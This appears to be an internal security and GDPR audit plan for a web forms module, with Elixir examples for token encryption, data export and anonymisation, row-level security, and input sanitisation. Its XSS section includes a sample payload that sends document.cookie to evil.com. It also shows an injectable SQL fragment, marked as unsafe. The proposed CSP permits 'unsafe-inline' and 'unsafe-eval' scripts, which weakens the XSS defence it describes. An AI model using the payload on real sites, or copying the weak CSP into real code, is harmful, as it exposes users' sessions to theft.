# Forms Builder - Security & GDPR Compliance

**Type**: Security Audit & Compliance Investigation
**Priority**: 🔴 Critical
**Status**: Needs Investigation
**Created**: 2025-11-14
**Blocking**: Production launch

## Overview

This dev_prompt focuses on security vulnerabilities, GDPR compliance, and data privacy requirements for the Forms Builder module. These must be addressed before production launch.

## Parent Task

Source: `dev_task_prompts/20251114-forms-builder-module/ISSUES.md`
- Concern #2: Data Privacy & GDPR
- Concern #3: Security - Token Exposure

## Stakeholders

**Must Review**:
- [ ] Security Team / CISO
- [ ] Legal / Compliance Team
- [ ] Data Protection Officer (DPO)
- [ ] Engineering Lead

**Optional**:
- [ ] External Security Auditor
- [ ] GDPR Consultant

---

## Critical Security Issues

### Issue #1: OAuth Token Exposure

**Risk Level**: 🔴 **CRITICAL**

**Threat**:
- OAuth tokens stored in database
- If leaked, attacker gains access to user's Google/Microsoft calendar
- Can read events, create events, delete events
- Potential data breach

**Current Specification**:
- Tokens encrypted at rest using AES-256-GCM
- Encryption via `cloak_ecto` library (to be decided in OAuth investigation)
- Tokens never sent to frontend
- Tokens never logged in plaintext

**Security Checklist**:

#### Encryption Requirements
- [ ] Tokens encrypted with AES-256-GCM or stronger
- [ ] Encryption keys stored securely (not in code)
- [ ] Encryption keys rotated quarterly
- [ ] Separate keys for dev/staging/production environments
- [ ] Key derivation uses strong KDF (PBKDF2, Argon2)

#### Access Controls
- [ ] Tokens only decrypted when needed for API calls
- [ ] Decryption audit logged (who, when, why)
- [ ] Rate limiting on decryption attempts
- [ ] Failed decryption attempts trigger alerts
- [ ] Tokens locked after N failed access attempts

#### Logging & Monitoring
- [ ] Token encryption/decryption logged (not the token itself)
- [ ] Alerts for unusual token access patterns
- [ ] Monitoring for token refresh failures
- [ ] Log retention policy defined
- [ ] Logs never contain plaintext tokens

#### Code Review
- [ ] Code review for token handling
- [ ] Static analysis for hardcoded secrets
- [ ] Dependency audit (vulnerable libraries)
- [ ] Penetration testing OAuth flows

**Implementation Requirements**:

```elixir
# Audit logging
defmodule Integrations.TokenAuditLog do
  def log_token_access(action, connection_id, user_id, metadata \\\\ %{}) do
    AuditLog.create(%{
      resource_type: "CalendarConnection",
      resource_id: connection_id,
      action: action,  # :token_encrypted, :token_decrypted, :token_rotated
      actor_id: user_id,
      metadata: Map.merge(metadata, %{
        timestamp: DateTime.utc_now(),
        ip_address: metadata[:ip],
        user_agent: metadata[:user_agent]
      }),
      severity: :high  # All token access is high severity
    })
  end
end

# Rate limiting
defmodule Integrations.TokenAccessLimiter do
  @max_decryptions_per_hour 100

  def check_rate_limit(connection_id) do
    count = count_recent_decryptions(connection_id, hours: 1)

    if count >= @max_decryptions_per_hour do
      {:error, :rate_limit_exceeded}
    else
      {:ok, count}
    end
  end
end
```

**Action Items**:
- [ ] Conduct threat modeling session
- [ ] Implement encryption audit trail
- [ ] Set up monitoring alerts
- [ ] Penetration test token handling
- [ ] Document incident response plan

---

### Issue #2: Form Submission PII (Personal Identifiable Information)

**Risk Level**: 🟠 **HIGH**

**Threat**:
- Form submissions contain PII (names, emails, phone numbers, addresses)
- Unauthorized access could expose customer data
- GDPR violations if not handled properly

**Current Specification**:
- FormSubmission data stored as JSON map
- No encryption at rest mentioned
- No data retention policy defined
- No anonymization on deletion

**GDPR Requirements**:

#### Right to Access (Article 15)
- [ ] Users can request all their data
- [ ] Data export in machine-readable format (JSON, CSV)
- [ ] Include all form submissions, leads, bookings
- [ ] Response within 30 days

#### Right to Deletion (Article 17)
- [ ] Users can request data deletion
- [ ] Delete or anonymize form submissions
- [ ] Delete chatbot conversations
- [ ] Delete calendar bookings (or anonymize)
- [ ] Cascade deletes to related records

#### Right to Rectification (Article 16)
- [ ] Users can correct inaccurate data
- [ ] Update mechanism for form submissions (?)
- [ ] Update lead information

#### Data Minimization (Article 5)
- [ ] Only collect necessary data
- [ ] Don't require fields not needed
- [ ] Clear purpose for each field

#### Consent (Article 6)
- [ ] Legal basis for processing (consent, contract, legitimate interest)
- [ ] Explicit consent checkboxes in forms (if required)
- [ ] Consent can be withdrawn

#### Data Retention (Article 5)
- [ ] Define retention periods
- [ ] Automatically delete old data
- [ ] Document retention policy

**Implementation Requirements**:

```elixir
# Data export
defmodule Forms.GDPRExport do
  def export_user_data(email) do
    %{
      form_submissions: FormSubmissions.list_by_email(email),
      chatbot_leads: ChatbotLeads.list_by_email(email),
      chatbot_conversations: ChatbotConversations.list_by_email(email),
      calendar_bookings: CalendarBookings.list_by_email(email),
      metadata: %{
        exported_at: DateTime.utc_now(),
        format: "JSON",
        version: "1.0"
      }
    }
    |> Jason.encode!(pretty: true)
  end
end

# Data deletion (anonymization)
defmodule Forms.GDPRDeletion do
  def anonymize_user_data(email) do
    # Form submissions: anonymize PII
    FormSubmissions.list_by_email(email)
    |> Enum.each(fn submission ->
      FormSubmissions.anonymize(submission, %{
        data: anonymize_submission_data(submission.data),
        anonymized_at: DateTime.utc_now(),
        anonymization_reason: "GDPR deletion request"
      })
    end)

    # Leads: soft delete or anonymize
    ChatbotLeads.list_by_email(email)
    |> Enum.each(&ChatbotLeads.anonymize/1)

    # Bookings: anonymize contact info, keep event for audit
    CalendarBookings.list_by_email(email)
    |> Enum.each(&CalendarBookings.anonymize/1)
  end

  defp anonymize_submission_data(data) do
    data
    |> Map.put("email", "deleted@privacy.local")
    |> Map.put("name", "REDACTED")
    |> Map.put("phone", "REDACTED")
    |> remove_pii_fields()
  end
end

# Data retention job
defmodule Forms.DataRetentionJob do
  use Oban.Worker, queue: :maintenance

  @retention_days 2555  # 7 years (common retention period)

  def perform(_job) do
    cutoff_date = Date.add(Date.utc_today(), -@retention_days)

    # Delete old anonymized submissions
    FormSubmissions.delete_old_anonymized(before: cutoff_date)

    # Delete old abandoned conversations
    ChatbotConversations.delete_abandoned(before: cutoff_date)

    :ok
  end
end
```

**Schema Changes Needed**:

```elixir
# form_submissions table
add :anonymized_at, :utc_datetime
add :anonymization_reason, :string
add :data_deleted, :boolean, default: false

# chatbot_leads table
add :anonymized_at, :utc_datetime
add :gdpr_consent, :boolean  # Did user consent to data processing?
add :gdpr_consent_at, :utc_datetime

# calendar_bookings table
add :anonymized_at, :utc_datetime
```

**Action Items**:
- [ ] Define data retention periods
- [ ] Implement anonymization functions
- [ ] Create GDPR export endpoint
- [ ] Create GDPR deletion workflow
- [ ] Add consent checkboxes to forms
- [ ] Document legal basis for processing
- [ ] Set up data retention job

---

### Issue #3: Cross-Company Data Isolation

**Risk Level**: 🟠 **HIGH**

**Threat**:
- Multi-tenant application (multiple companies share database)
- Risk of data leakage between companies
- Improper authorization could expose Company A's data to Company B

**Current Specification**:
- All resources have `company_id`
- Ash policies should enforce row-level security
- Not yet implemented in specs

**Security Requirements**:

#### Database-Level Isolation
- [ ] Use PostgreSQL Row-Level Security (RLS)
- [ ] Every query filtered by `company_id`
- [ ] Cannot bypass filter (even with raw SQL)

#### Application-Level Authorization
- [ ] Ash policies enforce company scoping
- [ ] All queries include company_id filter
- [ ] No global admin access (bypass carefully)

#### Testing
- [ ] Integration tests for cross-company access
- [ ] Penetration testing
- [ ] Automated tests for authorization

**Implementation Requirements**:

```elixir
# PostgreSQL Row-Level Security
defmodule Forms.Repo.Migrations.AddRowLevelSecurity do
  def up do
    # Enable RLS on all tables
    execute "ALTER TABLE forms ENABLE ROW LEVEL SECURITY"
    execute "ALTER TABLE form_submissions ENABLE ROW LEVEL SECURITY"
    execute "ALTER TABLE calendar_bookings ENABLE ROW LEVEL SECURITY"

    # Create policy: users can only see their company's data
    execute """
    CREATE POLICY company_isolation_policy ON forms
      USING (company_id = current_setting('app.current_company_id')::uuid)
    """
  end
end

# Ash policy
defmodule Forms.Form do
  policies do
    # Bypass for system operations
    policy action_type(:read) do
      authorize_if actor_attribute_equals(:role, :system)
    end

    # Enforce company scoping for all users
    policy action_type(:read) do
      authorize_if relates_to_actor_via(:company)
    end

    # Only company admins can create forms
    policy action_type(:create) do
      authorize_if actor_attribute_equals(:role, :admin)
      authorize_if relates_to_actor_via(:company)
    end
  end
end
```

**Action Items**:
- [ ] Implement PostgreSQL RLS
- [ ] Write Ash policies for all resources
- [ ] Test cross-company access prevention
- [ ] Document authorization model
- [ ] Penetration test multi-tenancy

---

### Issue #4: XSS (Cross-Site Scripting) in Form Fields

**Risk Level**: 🟡 **MEDIUM**

**Threat**:
- User can submit malicious JavaScript in form fields
- Script executed when admin views submission
- Could steal session tokens, deface UI, redirect to phishing

**Attack Example**:
```html
<!-- Attacker submits this in "Company Name" field -->
<script>
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({token: document.cookie})
  })
</script>
```

**Mitigation**:

#### Input Sanitization
- [ ] Sanitize all form submissions on save
- [ ] Strip HTML tags (or whitelist safe tags)
- [ ] Escape special characters

#### Output Encoding
- [ ] Use Phoenix HTML helpers (automatically escape)
- [ ] Never use `raw()` on user input
- [ ] Use Content Security Policy (CSP)

**Implementation**:

```elixir
# Input sanitization
defmodule Forms.InputSanitizer do
  @allowed_tags ["b", "i", "u", "em", "strong"]  # If allowing some HTML

  def sanitize(input) when is_binary(input) do
    HtmlSanitizeEx.strip_tags(input, @allowed_tags)
  end

  def sanitize(input), do: input
end

# In FormSubmission create action
changes do
  change fn changeset, _context ->
    data = Changeset.get_change(changeset, :data)
    sanitized_data = sanitize_data(data)
    Changeset.put_change(changeset, :data, sanitized_data)
  end
end
```

**Phoenix CSP Config**:
```elixir
# lib/clientt_crm_app_web/endpoint.ex
plug Plug.Session,
  ...

plug :put_secure_browser_headers, %{
  "content-security-policy" => """
    default-src 'self';
    script-src 'self' 'unsafe-inline' 'unsafe-eval';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self' data:;
    connect-src 'self' wss://#{endpoint_host};
  """
}
```

**Action Items**:
- [ ] Add input sanitization library
- [ ] Sanitize all form submission data
- [ ] Enable CSP headers
- [ ] Test XSS prevention
- [ ] Document safe rendering practices

---

### Issue #5: SQL Injection (via Ash Queries)

**Risk Level**: 🟡 **MEDIUM**

**Threat**:
- User input used in database queries
- Malicious input could bypass filters
- Unlikely with Ash (uses parameterized queries) but possible in custom expressions

**Mitigation**:
- [ ] Never use string interpolation in queries
- [ ] Use parameterized queries (Ash default)
- [ ] Validate/sanitize filter inputs
- [ ] Audit custom SQL fragments

**Example (Safe)**:
```elixir
# Good: Ash handles parameterization
Forms.Form
|> Ash.Query.filter(name == ^user_input)
|> Ash.read!()
```

**Example (Unsafe)**:
```elixir
# Bad: Direct SQL fragment with user input
Forms.Form
|> Ash.Query.filter(fragment("name = '#{user_input}'"))  # ❌ NEVER DO THIS
```

**Action Items**:
- [ ] Audit all queries for SQL injection risks
- [ ] Enable query logging in development
- [ ] Penetration test with SQL injection payloads

---

## GDPR Compliance Checklist

### Legal Basis for Processing
- [ ] **Consent**: User explicitly opts in to data processing
- [ ] **Contract**: Processing necessary to fulfill service
- [ ] **Legitimate Interest**: Documented legitimate interest (e.g., analytics)

### Privacy Policy
- [ ] Privacy policy written and published
- [ ] Explains what data is collected
- [ ] Explains why data is collected
- [ ] Explains how long data is retained
- [ ] Explains user rights (access, deletion, etc.)
- [ ] Link to privacy policy in forms

### Consent Management
- [ ] Consent checkboxes in forms (if required)
- [ ] Consent timestamp recorded
- [ ] Consent can be withdrawn
- [ ] Record of consent stored

### Data Processing Agreements (DPAs)
- [ ] DPA with Google (calendar integration)
- [ ] DPA with Microsoft (calendar integration)
- [ ] DPA with OpenAI (if using chatbot AI)
- [ ] DPA with hosting provider

### User Rights Implementation
- [ ] **Access**: Export user data endpoint
- [ ] **Deletion**: Anonymization workflow
- [ ] **Rectification**: Edit mechanism
- [ ] **Portability**: Machine-readable export format
- [ ] **Objection**: Opt-out mechanisms

### Data Retention
- [ ] Retention policy documented
- [ ] Automatic deletion job implemented
- [ ] Old data purged (7 years default)

### Security Measures
- [ ] Encryption at rest
- [ ] Encryption in transit (HTTPS)
- [ ] Access controls and auditing
- [ ] Regular security audits
- [ ] Incident response plan

### Data Breach Procedures
- [ ] Breach detection mechanisms
- [ ] Breach notification procedures (72 hours to authorities)
- [ ] User notification procedures
- [ ] Incident response team

---

## Compliance Requirements by Region

### GDPR (Europe)
- Applies to: Any user in EU
- Requirements: See checklist above
- Penalties: Up to €20M or 4% of revenue

### CCPA (California)
- Applies to: California residents
- Requirements: Similar to GDPR
- "Do Not Sell My Personal Information" link

### PIPEDA (Canada)
- Similar to GDPR
- Consent for collection/use/disclosure

### Other Jurisdictions
- Research requirements based on target markets

---

## Security Audit Recommendations

### Internal Audit (Before Launch)
- [ ] Code review focused on security
- [ ] Dependency audit (vulnerable libraries)
- [ ] Secrets scan (hardcoded keys)
- [ ] Permission audit (least privilege)
- [ ] Encryption verification
- [ ] Logging audit (no PII in logs)

### External Audit (Production)
- [ ] Hire external security firm
- [ ] Penetration testing
- [ ] OAuth flow testing
- [ ] Multi-tenancy testing
- [ ] GDPR compliance audit

### Ongoing Security
- [ ] Quarterly dependency updates
- [ ] Quarterly encryption key rotation
- [ ] Annual security audit
- [ ] Bug bounty program

---

## Implementation Roadmap

### Phase 1: Critical Security (Pre-MVP)
**Must Have for Launch**:
- [ ] Token encryption at rest
- [ ] Token audit logging
- [ ] Multi-tenancy isolation (RLS + policies)
- [ ] XSS prevention (input sanitization)
- [ ] HTTPS enforcement

**Timeline**: 2-3 weeks
**Owner**: Security Team + Engineering

### Phase 2: GDPR Basics (Pre-MVP)
**Must Have for Launch**:
- [ ] Privacy policy
- [ ] Consent checkboxes (if required)
- [ ] Data export endpoint
- [ ] Data deletion workflow (anonymization)

**Timeline**: 1-2 weeks
**Owner**: Legal + Engineering

### Phase 3: Advanced Compliance (Post-MVP)
**Nice to Have**:
- [ ] Data retention automation
- [ ] DPAs with vendors
- [ ] CCPA compliance
- [ ] External security audit

**Timeline**: Ongoing
**Owner**: Compliance Team

---

## Resources

### GDPR Resources
- [Official GDPR Text](https://gdpr-info.eu/)
- [ICO Guide (UK)](https://ico.org.uk/for-organisations/guide-to-data-protection/)
- [CNIL Guide (France)](https://www.cnil.fr/en/home)

### Security Resources
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Elixir Security Guide](https://hexdocs.pm/phoenix/security.html)
- [Ash Security Patterns](https://ash-hq.org/docs/guides/ash/latest/topics/security)

### Tools
- [Sobelow](https://github.com/nccgroup/sobelow) - Elixir security scanner
- [mix audit](https://github.com/mirego/mix_audit) - Dependency vulnerability scanner
- [Credo](https://github.com/rrrene/credo) - Code quality

---

## Decision Template

### Security Decisions
- [ ] **Token Encryption Library**: ___________ (cloak_ecto recommended)
- [ ] **Key Storage**: ___________ (env var, secrets manager)
- [ ] **RLS Enforcement**: ___________ (PostgreSQL RLS + Ash policies)
- [ ] **Input Sanitization**: ___________ (HtmlSanitizeEx)
- [ ] **CSP Enabled**: ___________ (Yes)

### GDPR Decisions
- [ ] **Legal Basis**: ___________ (consent, contract, legitimate interest)
- [ ] **Retention Period**: ___________ days (2555 = 7 years)
- [ ] **Anonymization Strategy**: ___________ (redact PII fields)
- [ ] **DPA Required**: ___________ (Yes for Google, Microsoft)

### Audit Plan
- [ ] **Internal Audit Date**: ___________
- [ ] **External Audit Date**: ___________
- [ ] **Penetration Test Date**: ___________

---

**Status**: Awaiting Security Review
**Critical Deadline**: Before Production Launch
**Owner**: Security Team
**Review Date**: TBD
